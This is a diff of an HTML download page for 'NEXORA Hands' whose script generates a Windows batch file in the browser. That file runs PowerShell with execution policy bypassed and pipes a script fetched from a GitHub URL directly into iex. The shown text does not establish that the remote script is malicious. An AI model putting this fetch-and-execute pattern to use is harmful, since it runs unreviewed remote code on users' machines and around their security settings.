@@ -3,14 +3,18 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
   <title>NEXORA Hands</title>
 </head>
 <body>
   <h2>NEXORA Hands</h2>
-  <p><button id="download">Download NEXORA Hands</button></p>
-  <p>The button creates the actual <b>NEXORA-Hands.cmd</b> file in your Downloads folder.</p>
+  <p>Click the button once. Your browser will download <b>NEXORA-Hands.cmd</b>.</p>
+  <p><button id="download" type="button">DOWNLOAD NEXORA HANDS</button></p>
+  <p id="status"></p>
   <script>
-    const cmd = `@echo off
+    const cmd = String.raw`@echo off
 setlocal
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/nexora-kz/NEXORA-Hands/main/remote.ps1 | iex"
 if errorlevel 1 (
@@ -19,17 +23,19 @@ if errorlevel 1 (
   pause >nul
 )
 `;
-    document.getElementById('download').addEventListener('click', () => {
-      const blob = new Blob([cmd], { type: 'application/octet-stream' });
+    document.getElementById('download').onclick = function () {
+      const blob = new Blob([cmd], {type: 'application/octet-stream'});
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
       a.download = 'NEXORA-Hands.cmd';
+      a.style.display = 'none';
       document.body.appendChild(a);
       a.click();
       a.remove();
-      setTimeout(() => URL.revokeObjectURL(url), 1000);
-    });
+      setTimeout(() => URL.revokeObjectURL(url), 5000);
+      document.getElementById('status').textContent = 'Download started: NEXORA-Hands.cmd';
+    };
   </script>
 </body>
 </html>
